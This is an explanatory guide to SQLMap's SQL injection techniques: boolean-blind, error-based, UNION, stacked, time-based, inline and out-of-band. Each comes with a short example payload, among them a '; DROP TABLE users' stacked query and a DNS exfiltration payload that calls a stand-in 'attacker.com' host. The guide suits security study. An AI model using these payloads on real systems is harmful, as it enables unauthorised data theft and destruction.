The technique characters `BEUSTQ` refers to the following:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries

### Types of SQL Injection Exploits Using SQLMap

#### 1. **Boolean-Based Blind SQL Injection**

In Boolean-based blind SQL Injection, SQLMap distinguishes between `TRUE` and `FALSE` results by comparing server responses. It retrieves 1 byte of data per request, based on factors like HTTP status codes, page content, or titles.

- **TRUE Results**: Responses are similar or identical to normal responses.
- **FALSE Results**: Responses show noticeable differences.

This is the most common type of SQLi in web applications.

#### Example:

sql

Copy code

`AND 1=1`

#### 2. **Error-Based SQL Injection**

Error-based SQL Injection leverages database errors returned by the server to extract information. SQLMap uses specialized payloads targeting specific database management systems (DBMS). It’s faster than most SQLi types, retrieving small data "chunks" in each request.

Supported DBMS:

- MySQL, PostgreSQL, Oracle, SQL Server, Sybase, Vertica, IBM DB2, Firebird, MonetDB.

#### Example:

sql

Copy code

`AND GTID_SUBSET(@@version,0)`

#### 3. **UNION Query-Based SQL Injection**

UNION query-based SQL Injection extends the original SQL query by merging it with injected data. If the original query’s results are displayed, the attacker can retrieve entire tables or data of interest in a single request, making it the fastest SQLi type.

#### Example:

sql

Copy code

`UNION ALL SELECT 1,@@version,3`

#### 4. **Stacked Queries (Piggybacking)**

Stacked queries allow injecting multiple SQL statements in one execution, especially useful for non-query actions like `INSERT`, `UPDATE`, or `DELETE`. This method is supported by certain DBMS (e.g., Microsoft SQL Server, PostgreSQL).

#### Example:

sql

Copy code

`; DROP TABLE users`

#### 5. **Time-Based Blind SQL Injection**

Time-based blind SQL Injection uses response delays to differentiate between `TRUE` and `FALSE`. Queries resulting in `TRUE` trigger noticeable response delays, while `FALSE` responses show no such delays. It’s slower than Boolean-based blind SQLi but effective in certain non-query situations (e.g., `INSERT`, `UPDATE`, `DELETE`).

#### Example:

sql

Copy code

`AND 1=IF(2>1,SLEEP(5),0)`

#### 6. **Inline Queries**

Inline queries embed a sub-query within the original SQL query. Though less common due to specific app design requirements, SQLMap supports this injection type.

#### Example:

sql

Copy code

`SELECT (SELECT @@version) FROM ...`

#### 7. **Out-of-Band SQL Injection**

Out-of-band SQL Injection is used when other methods are unsupported or too slow. SQLMap uses DNS exfiltration, forcing the target server to query controlled DNS servers, extracting SQL responses via DNS traffic.

#### Example:

sql

Copy code

`LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`

This is one of the most advanced SQL injection techniques.

These SQL injection types demonstrate various methods of exploiting vulnerabilities using SQLMap, tailored to different DBMS environments and server behaviors.
